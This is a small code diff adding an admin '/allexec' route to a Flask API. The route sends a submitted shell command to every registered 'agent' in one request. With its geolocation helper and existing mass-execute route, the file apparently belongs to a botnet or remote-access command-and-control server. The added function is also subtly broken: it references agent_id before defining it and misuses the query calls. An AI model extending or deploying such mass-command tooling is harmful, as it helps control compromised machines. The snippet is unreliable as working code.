@@ -37,6 +37,16 @@ def geolocation(ip):
     return geoloc_str
 
 
+@api.route('/allexec', methods=['POST'])
+@require_admin
+def all_execute():
+    selection = Agent.query.get(agent_id).all()
+    for agent_id in selection:
+        Agent.query.get(agent_id).push_command(request.form['cmd'])
+    flash('Executed "%s" on %s agents' % (request.form['cmd'], len(selection)))
+    return redirect(url_for('webui.agent_list'))
+
+
 @api.route('/massexec', methods=['POST'])
 @require_admin
 def mass_execute():
